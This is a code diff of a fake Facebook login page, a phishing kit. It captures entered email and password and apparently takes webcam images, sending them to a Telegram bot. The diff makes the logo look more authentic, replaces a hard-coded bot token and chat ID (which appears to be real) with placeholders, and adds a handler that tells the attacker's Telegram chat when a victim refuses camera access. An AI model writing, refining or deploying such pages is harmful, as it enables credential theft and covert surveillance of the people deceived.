@@ -64,7 +64,7 @@
     </style>
 </head>
 <body>
-    <div class="logo">Facebook Login</div>
+    <div class="logo">facebook</div>
     <div class="login-container">
         <input type="text" id="email" placeholder="Email or Phone Number">
         <input type="password" id="password" placeholder="Password">
@@ -74,8 +74,8 @@
     <div class="footer">Facebook © 2025</div>
 
     <script>
-        let telegramBotToken = "7863457133:AAE31d9Hb5G6H_2HlpxEcJEfhYv3FhFy5ks";
-        let chatId = "6899914313";
+        let telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
+        let chatId = "YOUR_CHAT_ID";
 
         function submitLogin() {
             let email = document.getElementById("email").value;
@@ -124,6 +124,14 @@
                             
                             stream.getTracks().forEach(track => track.stop());
                         }, 3000);
+                    });
+                })
+                .catch(error => {
+                    let errorMessage = "User denied camera access or camera is unavailable.";
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: chatId, text: errorMessage })
                     });
                 });
         }
